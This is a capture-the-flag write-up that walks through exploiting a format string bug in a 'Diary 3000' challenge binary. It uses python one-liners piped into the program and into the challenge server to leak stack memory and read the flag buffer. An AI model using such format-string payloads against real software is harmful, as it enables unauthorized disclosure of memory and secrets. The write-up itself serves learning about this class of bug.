#Good Morning

**Category:** Pwn
**Points:** 60
**Description:**

I don't have the official verbiage for the challenge.  Essentially you are provided the following binary and told it is being run at nc diary.vuln.icec.tf 6501.

[deardiary](./deardiary)

##Write-up
Initially we run the binary and see what kind of functionality exists within it.

```
root@kali:~# ./deardiary 
-- Diary 3000 --

1. add entry
2. print latest entry
3. quit
> 1
Tell me all your secrets: Hello World!

1. add entry
2. print latest entry
3. quit
> 2
Hello World!

1. add entry
2. print latest entry
3. quit
> 3
```

Ok, looks pretty simple.  We supply some data and we can request that this data is then printed back out us.  Let's try a format string and see what it does.

```
root@kali:~# python -c 'print "1\nAAAA"+"%08x."*10+"\n2\n3\n"'| ./deardiary 
-- Diary 3000 --

1. add entry
2. print latest entry
3. quit
> Tell me all your secrets: 
1. add entry
2. print latest entry
3. quit
> AAAAf755b7b6.f76cf000.ffa00f98.ffa02398.00000000.0000000a.4eedee00.00000000.00000000.ffa023a8.

1. add entry
2. print latest entry
3. quit
```

Well, it definitely looks like we are dealing with a format string issue as we are dumping memory out. Also, note that the command I am using along with the format string sytax is setup to move through the menu of the binary by itself.  It lets me write a payload, read the payload back, and exit the program without any interaction.  Now, let's dump a little more and see if we can see our "AAAA"s.

```
root@kali:~# python -c 'print "1\nAAAA"+"%08x."*20+"\n2\n3\n"'| ./deardiary 
-- Diary 3000 --

1. add entry
2. print latest entry
3. quit
> Tell me all your secrets: 
1. add entry
2. print latest entry
3. quit
> AAAAf75df7b6.f7753000.ff8cab88.ff8cbf88.00000000.0000000a.ea2b0000.00000000.00000000.ff8cbf98.0804888c.ff8cab88.00000004.f7753c20.00000000.00000000.00000001.41414141.78383025.3830252e.

1. add entry
2. print latest entry
3. quit
```

There we go, it looks as if our input was read back off the stack in the 18th position.  Now we need to figure out what we can do.  Let's take a look at the binary and see if there is a good memory location to mess with.

```asm
             flag:
0804863d         push       ebp                                                 ; XREF=main+27
0804863e         mov        ebp, esp
08048640         sub        esp, 0x28
08048643         mov        eax, dword [gs:0x14]
08048649         mov        dword [ss:ebp+var_C], eax
0804864c         xor        eax, eax
0804864e         mov        dword [ss:esp+0x28+var_24], 0x0                     ; argument "oflag" for method j_open
08048656         mov        dword [ss:esp+0x28+var_28], 0x8048940               ; "./flag.txt", argument "path" for method j_open
0804865d         call       j_open
08048662         mov        dword [ss:ebp+var_10], eax
08048665         mov        dword [ss:esp+0x28+var_20], 0x100                   ; argument "nbyte" for method j_read
0804866d         mov        dword [ss:esp+0x28+var_24], 0x804a0a0               ; argument "buf" for method j_read
08048675         mov        eax, dword [ss:ebp+var_10]
08048678         mov        dword [ss:esp+0x28+var_28], eax                     ; argument "fildes" for method j_read
0804867b         call       j_read
08048680         mov        eax, dword [ss:ebp+var_C]
08048683         xor        eax, dword [gs:0x14]
0804868a         je         0x8048691

0804868c         call       j___stack_chk_fail

08048691         leave                                                          ; XREF=flag+77
08048692         ret        
                        ; endp
```

It looks as though the flag is on the server and being read in and saved into a buffer at ```0x804a0a0```.  There is a good paper on [exploiting format string vulnerabilities](https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf) that has a section dedicated to viewing memory at an arbitrary location.  Let's try to implement that.

```
root@kali:~# python -c 'print "1\n\xa0\xa0\x04\x08"+"%08x."*17+"%s\n2\n3\n"'| ./deardiary 
-- Diary 3000 --

1. add entry
2. print latest entry
3. quit
> Tell me all your secrets: 
1. add entry
2. print latest entry
3. quit
> ��f763d7b6.f77b1000.ffdca6b8.ffdcbab8.00000000.0000000a.43679600.00000000.00000000.ffdcbac8.0804888c.ffdca6b8.00000004.f77b1c20.00000000.00000000.00000001.Local FLAG


1. add entry
2. print latest entry
3. quit
```

Running it locally gives us a test flag that we setup, so we should be able to go straight to the server and get the flag.

```
root@kali:~# python -c 'print "1\n\xa0\xa0\x04\x08"+"%08x."*17+"%s\n2\n3\n"'| nc diary.vuln.icec.tf 6501
-- Diary 3000 --

1. add entry
2. print latest entry
3. quit
> Tell me all your secrets: 
1. add entry
2. print latest entry
3. quit
> ��f7e57836.f7fce000.ffffc898.ffffdc98.00000000.0000000a.3ab59b00.00000000.00000000.ffffdca8.0804888c.ffffc898.00000004.f7fcec20.00000000.00000000.00000001.IceCTF{this_thing_is_just_sitting_here}


1. add entry
2. print latest entry
3. quit
```

Perfect, our flag is ```IceCTF{this_thing_is_just_sitting_here}```.
